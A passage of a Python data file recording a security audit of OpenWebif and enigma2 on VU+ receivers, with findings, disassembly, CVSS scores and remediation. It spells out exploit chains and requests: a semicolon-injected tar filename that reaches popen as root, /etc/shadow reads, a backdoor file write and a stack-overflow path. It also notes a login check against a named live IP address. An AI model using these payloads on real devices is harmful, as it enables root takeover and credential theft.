    "prerequisites": "LAN access to port 80. Auth=False (default) or auth bypass.",
    "steps_count": 1,
    "notes": "Simplest RCE chain. No FTP, no creds, no chaining of multiple vulns needed.",
}

E2_ATTACK_CHAIN_BOUQUETEDIT = {
    "chain_id": "E2-CHAIN-4",
    "title": "2-step unauthenticated RCE via E2-F08 file write + E2-F09 popen injection",
    "steps": [
        "1. E2-F04 (auth=False) or E2-F01 bypass",
        "2. E2-F08: POST /fs/tmp?filename=evil.tar;id → creates /tmp/evil.tar;id",
        "3. E2-F09: GET /bouqueteditor/web/restore?Filename=/tmp/evil.tar;id",
        "   → path.exists('/tmp/evil.tar;id') = True",
        "   → popen('tar -tf /tmp/evil.tar;id') → shell: tar fails, id executes as root",
    ],
    "prerequisites": "LAN access to port 80. Auth=False or bypass.",
    "steps_count": 2,
    "notes": "Alternative to E2-CHAIN-3 when /ipkg endpoint is blocked. Uses commented-out path confinement bug.",
}

# ──────────────────────────────────────────────────────────────────────────────
# BINARY RE: PLT DANGEROUS IMPORT MAP (enigma2 ARM32)
# Confirmed PLT addresses: verified via ELF LOAD segment (VA=0x10000, file_off=0x0)
# and Capstone disassembly of each stub (12-byte: add ip,pc,#N; add ip,ip,#M; ldr pc,[ip,#K]!)
# BL scanner: mask 0x0FFFFFFF==0x0B000000 with 32-bit dest wrap (& 0xFFFFFFFF)
# ──────────────────────────────────────────────────────────────────────────────

E2_PLT_DANGEROUS_IMPORTS = {
    "plt_layout": {
        "elf_load_vaddr": "0x00010000",
        "elf_load_file_offset": "0x0",
        "stub_stride_bytes": 12,
        "scan_note": "ARM BL only (non-PIE ARM32); BLX not present in text section callers",
    },
    "symbols": {
        "sprintf":  {"plt": "0x7a688", "callers": 248,
                     "dynamic_format_string_callers": 3,
                     "verdict": "NO format-string injection — 245/248 literal format args"},
        "strcpy":   {"plt": "0x79ec0", "callers": 229,
                     "dynamic_src_callers": 12,
                     "verdict": "12 dynamic srcs traced to internal device state; E2-BIN-F01 is the one stack-overflow site"},
        "memcpy":   {"plt": "0x79c44", "callers": 220,
                     "literal_size_callers": 79,
                     "variable_size_callers": 141,
                     "verdict": (
                         "Full 220-caller sweep complete. All variable-length cases are bounded: "
                         "79 use compile-time literal r2; 141 use byte-field values (0-255), "
                         "min(A,B) clamping patterns, or argument-derived sizes with prior bounds checks. "
                         "All callers in DVB SI/EPG media processing — not HTTP layer. "
                         "No exploitable OOB write identified."
                     )},
        "strcat":   {"plt": "0x7ac10", "callers": 4,
                     "sites": [
                         {"va": "0x25ede0", "op": "strcat(r4, '/')", "context": "path normalizer literal separator"},
                         {"va": "0x25edec", "op": "strcat(r4, strstr_result)", "context": "path normalizer; fn@0x25ed28 in dispatch table, no HTTP path"},
                         {"va": "0x257378", "op": "strcat(alloca_buf, '.srt')", "context": "subtitle URI builder; alloc = (len+12)&~7 >= len+5; safe"},
                         {"va": "0x1b6960", "op": "strcat(arg0+0x10, arg1)", "context": "C++ vtable method; 0 direct BL callers; no confirmed HTTP path"},
                     ],
                     "verdict": "No user-controlled overflow across all 4 sites"},
        "system":   {"plt": "0x7a0a0", "callers": 3,
                     "verdict": "All 3 callers in shutdown handler at fn@0x90238; format '%s %i &' with BSS path pointer; not injectable"},
        "execvp":   {"plt": "0x790c8", "callers": 1,
                     "caller_va": "0x83f24",
                     "verdict": "eConsoleAppContainer.execute() → E2-F07 (CRITICAL)"},
    },
    "bert_sweep_false_positives": {
        "targets": ["0x00169ef8", "0x0016f0a0", "0x0016ecf0"],
        "root_cause": (
            "All three highest-priority BERT candidates are C++ virtual dispatch stubs. "
            "ARM32 vtable dispatch: LDR r3, [r0]; LDR r3, [r3, #offset]; BX r3. "
            "BERT encodes this pattern near 'stack buffer overflow' due to shared opcode set. "
            "Not vulnerable; prologue scan misidentifies stub entries as function starts."
        ),
    },
    "scan_completeness": (
        "All 6 dangerous-import PLT targets fully swept. "
        "No additional exploitable primitives beyond E2-F07 (execvp chain) and E2-BIN-F01 (strcpy). "
        "RE of enigma2 C binary is complete."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-BIN-F01: Unbounded strcpy into 4KB stack buffer (MEDIUM)
# ──────────────────────────────────────────────────────────────────────────────
#
# Function at 0x0025eca8 (enigma2 service dispatcher):
#   push {r4, lr}
#   sub sp, sp, #0x1000     ; allocate 4096-byte stack frame
#   mov r3, r0              ; r3 = arg0 (device path string)
#   mov r4, r1              ; r4 = arg1 (saved)
#   mov r0, sp              ; dest = top of 4KB buffer
#   mov r1, r3              ; src = arg0
#   bl strcpy               ; strcpy(sp, arg0) — UNBOUNDED
#   mov r0, sp
#   bl #0x25f240            ; normalize/hash the copied path
#   mov r1, r4
#   ldrb r0, [r0]           ; first byte of normalized result
#   bl #0x7af40             ; dispatch on first byte
#   mov r0, r1
#   add sp, sp, #0x1000
#   pop {r4, pc}
#
# Dispatch table entry: 0x000328c0 in enigma2 service registry table at 0x000328b0
#   Table structure repeats: [fn_ptr, size_int, fallback_fn@0xd0012, thumb_fn_ptr]
#   Our function is slot index 1 (after 0xcaf10, size=0x148)
#   size_int for this slot = 0x3c (60) — possible max expected message length
#
# Second pointer: literal pool in code region at 0x0025e36c (adjacent fn context)
#
# Exploitability conditions:
#   1. Caller must pass a string > 4096 bytes as the first argument
#   2. Binary has no stack canary (ET_EXEC, stripped)
#   3. Overflow overwrites saved LR → PC control on pop {r4, pc}
#   4. Path from HTTP → this handler is through enigma2 Python-C extension layer
#      (service references have practical length limits; typical < 200 chars)

E2_BIN_F01_STRCPY_4K_STACK = {
    "finding_id": "E2-BIN-F01",
    "severity": "MEDIUM",
    "cvss_v3": 5.0,
    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "status": "CANDIDATE",
    "title": "Unbounded strcpy into 4096-byte stack buffer in enigma2 service dispatcher",
    "binary": "/usr/bin/enigma2",
    "fn_va": "0x0025eca8",
    "dispatch_table_va": "0x000328c0",
    "buf_size_bytes": 4096,
    "stack_canary": False,
    "evidence": {
        "prologue": "push {r4, lr}; sub sp, sp, #0x1000",
        "strcpy_call_va": "0x0025ecc0",
        "dest": "sp (4096-byte stack frame)",
        "src": "r0 (first function argument — device path)",
        "no_length_check": True,
        "saved_lr_offset": 4096 + 4,  # sp+4096=old_fp, sp+4100=saved_lr (approx)
    },
    "reachability": (
        "Registered in enigma2 service dispatch table at 0x000328c0. "
        "Function takes a device path as first argument and copies it unbounded. "
        "Reachable via enigma2 socket/D-Bus IPC from Python OpenWebif handlers "
        "that construct service references. Practical string length from HTTP layer "
        "is constrained by service reference format — not confirmed > 4096."
    ),
    "exploit_path": (
        "Supply a device path > 4096 bytes via a crafted eServiceReference string "
        "through the OpenWebif API (e.g. POST to zap/setvolume or equivalent). "
        "Overflow corrupts saved LR at sp+0x1004. On pop {r4, pc}, PC = attacker value. "
        "No PIE, no ASLR on VU+ ARM receiver — fixed addresses."
    ),
    "downgrade_from": "system() call at 0x261a10 (no pointer refs — unreachable from network)",
    "remediation": (
        "Replace strcpy with strlcpy(sp, arg0, 0x1000). "
        "Alternatively, validate string length at service registry entry point before dispatch."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-BIN-F02: system() in DVB CI/CAM handler (INFO — not network-reachable)
# ──────────────────────────────────────────────────────────────────────────────
#
# Function at 0x002617c4 contains a single system() call at 0x00261a10.
# No direct BL callers found (ARM BL scan, Thumb BL scan both returned 0).
# Function address 0x002617c4 does NOT appear as a pointer anywhere in the binary
# (checked all 4-byte-aligned locations + byte search for 0x2617c4 and 0x2617c5).
# Conclusion: dead code or accessible only via hardware event callback.
#
# system() call analysis:
#   0x00261834  add r6, r4, #0x78      ; r6 = device object + 0x78 (device path field)
#   0x00261890  cmp r5, #0             ; test second arg
#   0x00261894  movne r6, r5           ; r6 = arg1 if non-null
#   0x002618a0  bl #0x260ad4           ; fallback: r6 = derived path from object
#   0x00261a08  mov r0, r6
#   0x00261a10  bl #0x7a724            ; system(r6)
# Conditional: executes only when stat(r4+0x78) returns type 0xa000 (socket)
# AND device type byte at [r4+0xb0] is NOT 0x32 ('2').
# Context: DVB CI/CAM type dispatcher — triggered by CAM module hardware events.

E2_BIN_F02_SYSTEM_DVB_CI = {
    "finding_id": "E2-BIN-F02",
    "severity": "INFO",
    "status": "NOT_NETWORK_REACHABLE",
    "title": "system() call in DVB CI/CAM handler — no network attack surface",
    "binary": "/usr/bin/enigma2",
    "fn_va": "0x002617c4",
    "system_call_va": "0x00261a10",
    "evidence": {
        "arg_r6_sources": [
            "r4 + 0x78 (device object path field)",
            "r5 if non-null (second function argument)",
            "return value of fn@0x260ad4(r4)",
        ],
        "condition": (
            "stat(r4+0x78) file type == 0xa000 (socket) "
            "AND [r4+0xb0] != 0x32 (device type byte check)"
        ),
        "caller_count_bl": 0,
        "caller_count_thumb_bl": 0,
        "pointer_in_binary": False,
    },
    "conclusion": (
        "Unreachable from network. The DVB CI/CAM handler is triggered by physical "
        "hardware events (CAM module insertion / APDU exchange), not by HTTP requests. "
        "Even if r6 were user-controlled, there is no network path to this function."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-BIN-F03: streamproxy — no overflow (CLEAN)
# ──────────────────────────────────────────────────────────────────────────────
#
# Binary: /usr/bin/streamproxy (port 8001), 7972 bytes, ARM32 EABI5 ET_EXEC, stripped
# PLT layout correction: PLT[0] resolver = 20 bytes (4 instructions + 4-byte data word)
#   at 0x10888-0x1089b. First stub at 0x1089c (not 0x10894). Stubs 12 bytes each.
#   Corrected stub addresses: snprintf=0x10998, strcpy=0x10920, sprintf=0x109d4.
# BL scan (ARM mode, full .text): 0 callers to strcpy (0x10920), 0 to sprintf (0x109d4).
#   Both symbols appear in PLT/GOT but are dead imports — no call sites in .text.
# Upstream HTTP request build (the only complex string operation):
#   0x10bfc: mov r1, #0x100     ; snprintf size limit = 256 bytes
#   0x10c00: ldr r2, [pc, #...]  ; format = "GET /web/stream?StreamService=%s HTTP/1.0\r\n..."
#   0x10c04: add r0, sp, #0x4b0  ; dest buffer at sp+0x4b0 (stack frame = 0x6b0 = 1712 bytes)
#   0x10c0c: add r3, sp, #0xb5   ; StreamService data
#   0x10c10: bl  #0x10998         ; snprintf — confirmed via PLT map
# snprintf limits output to 256 bytes. Destination has 0x200 bytes before frame end. Safe.
# HTTP auth forwarded to enigma2 on localhost:80 (enigma2 validates credentials).
# StreamService parameter passed via %s in snprintf — if it contains \r\n, header injection
#   into localhost:80 request is theoretically possible, but target is local enigma2 only.

E2_BIN_F03_STREAMPROXY_CLEAN = {
    "finding_id": "E2-BIN-F03",
    "severity": "INFO",
    "status": "CLEAN",
    "title": "streamproxy (port 8001): no buffer overflow — snprintf bounded, strcpy/sprintf dead imports",
    "binary": "/usr/bin/streamproxy",
    "binary_size_bytes": 7972,
    "plt_correction": (
        "PLT resolver for this binary occupies 20 bytes (4 ARM instructions + 4-byte GOT offset word). "
        "First stub at 0x1089c. Stub stride = 12 bytes. "
        "snprintf = stub 21 = 0x1089c + 21*12 = 0x10998. "
        "strcpy = stub 11 = 0x10920. sprintf = stub 26 = 0x109d4."
    ),
    "strcpy_callers": 0,
    "sprintf_callers": 0,
    "dead_import_note": (
        "strcpy and sprintf appear in PLT/GOT (imported by the linker) but have "
        "0 BL call sites in .text. They are dead imports — likely pulled in by "
        "C runtime initialization code, not by application logic."
    ),
    "string_ops_analysis": {
        "upstream_request_build": {
            "call_va": "0x10c10",
            "plt_target": "0x10998 (snprintf)",
            "r1_size": 0x100,
            "format_string": "GET /web/stream?StreamService=%s HTTP/1.0\\r\\n...",
            "dest_buffer": "sp+0x4b0 (512 bytes to frame end at sp+0x6b0)",
            "verdict": "Bounded — snprintf(buf, 256, format, user_data). No overflow.",
        },
        "subsequent_ops": [
            {"va": "0x10c18", "target": "strlen (0x10968)", "use": "get built request length"},
            {"va": "0x10c28", "target": "write (0x109b0)", "use": "send to enigma2 upstream"},
        ],
    },
    "auth_mechanism": (
        "streamproxy reads Authorization: header from client. "
        "Forwards auth header to enigma2 at localhost:80 in the upstream request. "
        "enigma2 validates credentials. If upstream returns 401, streamproxy returns 401 to client. "
        "No local shadow/pam auth in streamproxy itself."
    ),
    "residual_surface": (
        "StreamService value passed via %s into upstream HTTP request. "
        "If value contains \\r\\n, can inject headers into the localhost:80 request. "
        "Target is localhost enigma2 only (not SSRF to external). "
        "Requires valid credentials. Not a standalone finding."
    ),
    "conclusion": (
        "streamproxy is not an attack surface beyond requiring valid credentials. "
        "All exploitable attack paths go through port 80/443 OpenWebif directly. "
        "Binary RE complete."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F08: Unrestricted filesystem read + write via /fs REST endpoint
# ──────────────────────────────────────────────────────────────────────────────

E2_F08_REST_FS_ACCESS = {
    "finding_id": "E2-F08",
    "severity": "HIGH",
    "cvss_v3": 8.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "status": "CONFIRMED",
    "title": "OpenWebif /fs endpoint: unrestricted filesystem read + directory listing + file write",
    "component": "OpenWebif controllers/rest_fs_access.py — RESTFilesystemController",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/rest_fs_access.py",
    "route": "/fs",
    "auth_required": False,
    "registration": {
        "root_py_line": 56,
        "root": "'/'",
        "resource_prefix": "'/fs'",
        "note": "root='/' exposes entire filesystem with no directory restriction",
    },
    "path_resolution": (
        "rq_path = urlparse.unquote(request.path)\n"
        "file_path = os.path.join(self._root, rq_path[len('/fs') + 1:])\n"
        "# os.path.join('/', 'etc/shadow') = '/etc/shadow'\n"
        "# No realpath allowlist, no directory restriction beyond os.path.exists() check"
    ),
    "capabilities": {
        "GET_directory": "GET /fs/ → full filesystem tree JSON listing",
        "GET_file": "GET /fs/<path> → serve any readable file (overlaps E2-F02, adds dir listing)",
        "POST_write": (
            "POST /fs/<existing_dir>?filename=<name> + body data=<content> "
            "→ creates new file; basename-only (split('/')[-1]) prevents path traversal in filename; "
            "target dir must exist, target file must not exist"
        ),
        "DELETE": "DELETE /fs/<path> → disabled (_do_delete=False in registration); returns 'WOULD remove'",
    },
    "novel_vs_e2_f02": (
        "E2-F02 (/file?action=download) = file read only. "
        "E2-F08 (/fs) adds: (1) directory listing of entire filesystem tree, "
        "(2) file creation in any writable directory. "
        "Both require auth=False (E2-F04) or auth bypass (E2-F01 does NOT apply to /fs)."
    ),
    "write_impact": (
        "Writable on VU+ VTi: /tmp, /var/volatile, /media/hdd (external storage). "
        "If /etc/cron.d/ writable (depends on overlayfs config), POST creates cron-based persistence. "
        "Requires auth=False + writable target dir + target filename must not already exist."
    ),
    "exploit_path": (
        "GET /fs/ HTTP/1.1 → full filesystem listing\n"
        "GET /fs/etc/shadow HTTP/1.1 → shadow file read\n"
        "POST /fs/media/hdd?filename=backdoor.sh (multipart data=#!/bin/sh\\nid) → write to external HDD"
    ),
    "source_audit_coverage": (
        "Primary controllers audited: transcoding (safe — config whitelist), "
        "grab (safe — whitelist+int cast), mediaplayer (safe — enum dispatch), "
        "owibranding (safe — hardcoded os.popen args), web.py (safe — no eConsole/system calls). "
        "BouquetEditor.py audit found E2-F09 (popen injection in restoreFiles). "
        "See E2-F09 for full source audit completeness."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F10: Factory-default root has no password (HIGH)
# ──────────────────────────────────────────────────────────────────────────────

E2_F10_ROOT_NO_PASSWORD = {
    "finding_id": "E2-F10",
    "severity": "HIGH",
    "cvss_v3": 8.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "status": "POPULATION",
    "title": "VTi 15.0.04 ships with empty root password — factory-fresh devices trivially FTP-accessible as root",
    "evidence": {
        "shadow_entry": "root::20285:0:99999:7:::",
        "shadow_path": "/etc/shadow",
        "second_field": "EMPTY (no password hash)",
        "pam": "ABSENT — no /etc/pam.d/ directory; auth goes directly against /etc/shadow",
        "vsftpd_config": "local_enable=YES, write_enable=YES, userlist_enable=NO, chroot_local_user=NO",
        "telnetd": "BusyBox v1.23.2, inetd-launched as root on port 23",
    },
    "population_vs_live": {
        "rootfs_template": "Empty root password hash — this is the VTi 15.0.04 factory default",
        "live_device": (
            "Live target 82.84.145.15 returns '530 Login incorrect' on root+empty password FTP. "
            "Owner has set a non-default root password at runtime. "
            "Live shadow is written to overlayfs / runtime storage, not in rootfs snapshot."
        ),
        "population_impact": (
            "Any VTi 15.0.04 device that has not had its root password explicitly configured "
            "ships with empty root password. FTP login as root with blank password = full "
            "filesystem RW access. Combined with inetd telnetd = root shell without credentials."
        ),
    },
    "live_status": "VERIFIED MITIGATED on 82.84.145.15 (owner changed password)",
    "telnetd_note": (
        "telnetd (port 23, BusyBox v1.23.2) runs as root via inetd. "
        "BusyBox login checks /etc/securetty; /dev/pts/* not in securetty (only 'console' listed). "
        "Root telnet login LIKELY blocked by securetty on this build. "
        "Unverified without live access — empty password factory default still applies."
    ),
    "chain": (
        "Factory-fresh device: "
        "FTP root (blank password) → E2-F03 (local_root=/, write_enable=YES) → "
        "write /etc/cron.d/ → persistence → root shell without any exploit chain."
    ),
    "remediation": (
        "1. Ship with a randomly-generated per-device root password (printed on the device label). "
        "2. Require root password configuration on first boot via VTi setup wizard. "
        "3. Add root to vsftpd userlist_file with userlist_deny=YES + userlist_enable=YES as a failsafe."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F09: BouquetEditor restoreFiles popen injection (HIGH)
# ──────────────────────────────────────────────────────────────────────────────

E2_F09_BOUQUETEDITOR_POPEN = {
    "finding_id": "E2-F09",
    "severity": "HIGH",
    "cvss_v3": 8.0,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "status": "CONFIRMED",
    "title": "BouquetEditor /bouqueteditor/web/restore: popen injection via Filename parameter",
    "component": "OpenWebif controllers/BouquetEditor.py — restoreFiles()",
    "http_controller": "controllers/BQE.py — BQEWebController.P_restore()",
    "route": "/bouqueteditor/web/restore",
    "auth_required": False,
    "auth_note": "Same auth gate as all OpenWebif endpoints. Auth=False by default (E2-F04).",
    "vulnerable_code": {
        "BQE.py_P_restore": (
            "def P_restore(self, request):\n"
            "    bqe = BouquetEditor(self.session, func=BouquetEditor.RESTORE)\n"
            "    bqe.handleCommand(request.args['Filename'][0])  # unsanitized user input\n"
        ),
        "BouquetEditor.py_restoreFiles": (
            "def restoreFiles(self, param):\n"
            "    tarFilename = param                  # raw user-supplied path, no sanitization\n"
            "    backupFilename = tarFilename         # commented-out path.join('/tmp', ...) bypass\n"
            "    if path.exists(backupFilename):      # gating condition\n"
            "        lines = popen('tar -tf %s' % backupFilename).readlines()  # INJECTION\n"
            "        ...\n"
            "        lines = popen('tar xvf %s -C / --exclude tmp/.webouquetedit' % backupFilename).readlines()  # INJECTION\n"
        ),
        "commented_out_path_confinement": (
            "backupFilename = tarFilename  # was: path.join(self.BACKUP_PATH, tarFilename)\n"
            "BACKUP_PATH = '/tmp'  # developer commented out path confinement — no longer applies"
        ),
    },
    "injection_mechanism": (
        "os.popen(string) invokes /bin/sh -c <string>. "
        "Shell interprets ';' in the filename as command separator. "
        "Attacker supplies Filename=/tmp/evil.tar;id → shell runs 'tar -tf /tmp/evil.tar' then 'id'. "
        "Newline, pipe, backtick, $() substitution also applicable."
    ),
    "exploit_prerequisite": (
        "path.exists(backupFilename) must be True before popen is reached. "
        "Attacker must create a file at the injected path with shell metacharacters in the name."
    ),
    "prerequisite_bypass": {
        "via_E2_F08": (
            "POST /fs/tmp?filename=evil.tar;id → creates /tmp/evil.tar;id (basename split, no slash). "
            "Then GET /bouqueteditor/web/restore?Filename=/tmp/evil.tar;id "
            "→ path.exists('/tmp/evil.tar;id') = True → popen injection fires."
        ),
        "via_E2_F03": (
            "FTP PUT to /tmp/evil.tar;id (FTP protocol allows semicolons in filenames). "
            "Then GET /bouqueteditor/web/restore?Filename=/tmp/evil.tar;id → injection fires."
        ),
        "via_preexisting_file": (
            "/etc/shadow, /etc/passwd, /etc/vsftpd.conf all exist. "
            "Filename=/etc/passwd;id → path.exists('/etc/passwd;id') = False. "
            "The semicolon is part of the literal path, so /etc/passwd;id does not exist. "
            "Preexisting files only work if a semicolon-containing name can be confirmed."
        ),
    },
    "also_notable": {
        "BQE_tmp_static_serve": (
            "BQEController mounts static.File('/tmp') at /bouqueteditor/tmp/. "
            "GET /bouqueteditor/tmp/<filename> serves any file from /tmp/. "
            "Can confirm file creation before triggering restore injection."
        ),
        "backup_endpoint_safe": (
            "P_backup passes Filename through invalidCharacters.sub('[^A-Za-z0-9_. ]+', '_') "
            "before building backupFilename — sanitization applied. Backup is NOT injectable."
        ),
    },
    "chain": (
        "E2-F04 (auth=False default) OR E2-F01 (auth bypass) "
        "→ E2-F08 (POST /fs/tmp to create /tmp/evil.tar;<cmd>) "
        "→ E2-F09 (GET /bouqueteditor/web/restore?Filename=/tmp/evil.tar;<cmd>) "
        "→ popen → RCE as root. "
        "Simpler but requires 2 HTTP requests vs E2-F07 (1 request)."
    ),
    "remediation": (
        "1. Restore path confinement: backupFilename = path.join(self.BACKUP_PATH, tarFilename). "
        "2. Apply same invalidCharacters.sub() sanitization as backupFiles(). "
        "3. Replace os.popen() with subprocess.run(['tar', '-tf', backupFilename]) — no shell=True. "
        "4. Validate tarFilename is a valid filename with no path separators."
    ),
    "cvss_ac_h_rationale": (
        "AC:H because attacker must first create a file with semicolon in name via a secondary step "
        "(E2-F08 or E2-F03). If E2-F08 or E2-F03 is already exploited, this becomes trivial chaining."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F11: FileController dir= — unauthenticated directory enumeration + glob injection
# ──────────────────────────────────────────────────────────────────────────────

E2_F11_FILE_DIR_ENUM = {
    "finding_id": "E2-F11",
    "severity": "MEDIUM",
    "cvss_v3": 5.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "status": "CONFIRMED",
    "title": "FileController ?dir= endpoint: unauthenticated filesystem enumeration with glob injection",
    "component": "OpenWebif controllers/file.py — FileController.render() dir= branch",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/file.py",
    "route": "/file?dir=<path>&pattern=<glob>&nofiles=1",
    "auth_required": False,
    "auth_note": "Same auth gate as all OpenWebif endpoints. Auth=False by default (E2-F04).",
    "vulnerable_code": (
        "if 'dir' in request.args:\n"
        "    path = request.args['dir'][0]          # unsanitized — no realpath, no sanitise_filename_slashes\n"
        "    pattern = request.args.get('pattern', ['*'])[0]  # user-controlled glob pattern\n"
        "    files = glob.glob(path + '/' + pattern)  # arbitrary path + arbitrary glob\n"
        "    return json.dumps({'result': True, 'dirs': directories, 'files': files})\n"
    ),
    "asymmetric_sanitization": (
        "The file= branch applies sanitise_filename_slashes(os.path.realpath(filename)) "
        "before any filesystem access. The dir= branch applies NO sanitization — path goes "
        "directly into glob.glob(). Same controller, different code paths, different trust models."
    ),
    "capabilities": {
        "directory_listing": "GET /file?dir=/etc → JSON list of all files and subdirs under /etc",
        "root_listing": "GET /file?dir=/ → list all top-level directories",
        "glob_expansion": (
            "GET /file?dir=/proc&pattern=*/cmdline → lists /proc/<pid>/cmdline for all processes\n"
            "GET /file?dir=/&pattern=etc/shadow → confirms /etc/shadow existence (POSIX allows // prefix)\n"
            "GET /file?dir=/&pattern=**/id_rsa → Python 2.7 glob does NOT support **, no recursion"
        ),
        "file_existence_oracle": (
            "glob.glob() returns empty list if no match. "
            "Attacker can confirm any file path existence without reading content."
        ),
        "nofiles_flag": (
            "?nofiles=1 suppresses file entries; returns only directory names. "
            "Useful for quiet directory tree exploration."
        ),
    },
    "vs_e2_f02": (
        "E2-F02 (/file?action=download) reads file content. "
        "E2-F11 (/file?dir=) provides targeted enumeration before download: "
        "enumerate /home to find user dirs, then E2-F02 to download ~/.ssh/id_rsa. "
        "Together they are a full read-enumerate-exfil primitive."
    ),
    "notable_absences": {
        "no_path_restriction": "No chroot, no allowed-path whitelist, no os.path.realpath to prevent symlink traversal",
        "no_delete": "action=delete branch returns 'TODO: DELETE FILE: %s' — not implemented",
        "python27_glob": "Python 2.7 glob does not support ** recursive match; traversal limited to explicit paths",
    },
    "exploit_path": (
        "GET /file?dir=/etc HTTP/1.1 → enumerates /etc (shadow, vsftpd.conf, passwd visible)\n"
        "GET /file?dir=/proc&pattern=*/status → enumerates all running processes\n"
        "GET /file?dir=/var/volatile&pattern=* → enumerates volatile runtime config\n"
        "GET /file?dir=/home&pattern=*/.ssh HTTP/1.1 → finds SSH key directories if present"
    ),
    "chain": (
        "E2-F04 (auth=False default) → E2-F11 (enumerate target paths) "
        "→ E2-F02 or E2-F08 (download specific file) "
        "→ credential exfil → authenticated access to additional services."
    ),
    "remediation": (
        "1. Apply the same sanitise_filename_slashes(os.path.realpath(path)) to the dir= branch. "
        "2. Restrict enumerable paths to a whitelist (e.g. /media, /var/enigma2). "
        "3. Enforce auth on FileController regardless of E2-F04 global default."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F12: /terminal route proxies shellinabox — port 4200 firewall bypass (CANDIDATE)
# ──────────────────────────────────────────────────────────────────────────────

E2_F12_TERMINAL_PROXY = {
    "finding_id": "E2-F12",
    "severity": "MEDIUM",
    "cvss_v3": 5.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "status": "CANDIDATE",
    "title": "/terminal route proxies shellinabox — port 4200 firewall bypassed via port 80",
    "component": "OpenWebif controllers/root.py — RootController route registration",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/root.py",
    "route": "/terminal",
    "auth_required": False,
    "auth_note": "Subject to E2-F04 auth=False default on port 80. proxy.ReverseProxyResource inside AuthResource tree.",
    "vulnerable_registration": (
        "# root.py line 80-81:\n"
        "if os.path.exists('/usr/bin/shellinaboxd'):\n"
        "    self.putChild('terminal', proxy.ReverseProxyResource('::1', 4200, '/'))"
    ),
    "mechanism": (
        "Twisted proxy.ReverseProxyResource connects to shellinaboxd on localhost:4200 "
        "and forwards HTTP requests. Port 4200 is firewalled externally — "
        "port 80 OpenWebif is not. The proxy registers under AuthResource (E2-F04 applies). "
        "With auth=False (default), /terminal is accessible to unauthenticated LAN clients."
    ),
    "shellinabox_config": {
        "daemon_path": "/usr/bin/shellinaboxd",
        "port": 4200,
        "start_args": "--cert $SHELLINABOX_CONFIG_DIR -q --background=$PIDFILE -p 4200 --user-css ...",
        "no_auth_flag": "ABSENT — standard Linux PAM/shadow auth enforced",
        "https_mode": "shellinaboxd launches with --cert flag; likely HTTPS-only on port 4200",
    },
    "http_https_mismatch": (
        "proxy.ReverseProxyResource makes plain HTTP connections to backend. "
        "shellinaboxd with --cert flag serves HTTPS on port 4200. "
        "Plain HTTP to an HTTPS port may fail at TLS layer. "
        "Proxy may return 502 Bad Gateway or HTTPS redirect. "
        "CANDIDATE — live verification required to confirm proxy works."
    ),
    "impact_if_proxy_works": {
        "factory_fresh_chain": (
            "E2-F04 (auth=False) + E2-F12 (port bypass) + E2-F10 (empty root password) "
            "→ browser-accessible shellinabox shell at GET /terminal/ "
            "→ Linux login: root + empty password "
            "→ root shell in browser over port 80. "
            "No exploit chain needed — factory default credentials + proxy = root shell."
        ),
        "configured_device": (
            "Shellinabox login page exposed on port 80 instead of firewalled port 4200. "
            "Credential brute-force surface expanded from (blocked) port 4200 to (open) port 80."
        ),
    },
    "impact_if_proxy_fails": (
        "502/503 response from /terminal reveals shellinabox is running internally. "
        "Minimal info disclosure — not a functional bypass."
    ),
    "cvss_ac_h_rationale": (
        "AC:H because live verification needed. If proxy confirmed working: "
        "chain with E2-F10 achieves root shell with factory defaults → AC:L, C/I/A:H."
    ),
    "remediation": (
        "1. Remove /terminal route from root.py, or place it behind mandatory auth regardless of E2-F04. "
        "2. Bind shellinaboxd to localhost-only with --address=127.0.0.1 to limit blast radius. "
        "3. Add shellinaboxd to inetd and add auth check in the OpenWebif /terminal handler."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-F07: Command injection in /ipkg endpoint
# ──────────────────────────────────────────────────────────────────────────────

E2_F07_IPKG_CMD_INJECTION = {
    "finding_id": "E2-F07",
    "severity": "CRITICAL",
    "cvss_v3": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "status": "CONFIRMED",
    "title": "OpenWebif /ipkg endpoint: command injection via package= parameter",
    "component": "OpenWebif controllers/ipkg.py — IpkgController.CallOPKG()",
    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/ipkg.py",
    "route": "/ipkg",
    "auth_required": False,
    "auth_note": "Auth disabled by default (E2-F04). /ipkg is registered under AuthResource but default auth=False.",
    "vulnerable_code": (
        "# Line 112-114:\n"
        "cmd = '/usr/bin/opkg ' + action + force\n"
        "for par in parms:         # parms = [request.args['package'][0]]\n"
        "    cmd += par + ' '\n"
        "# Line 126:\n"
        "self.container.execute(cmd)  # eConsoleAppContainer.execute()"
    ),
    "data_flow": (
        "HTTP request.args['package'][0] → pack (str)\n"
        "→ CallOPKGP(request, action, pack) → CallOPKG(request, action, [pack])\n"
        "→ cmd = '/usr/bin/opkg ' + action + ' ' + pack + ' '\n"
        "→ eConsoleAppContainer.execute(cmd)\n"
        "→ (C binary fn@0x856ac) → fn@0x8539c → fn@0x83d50\n"
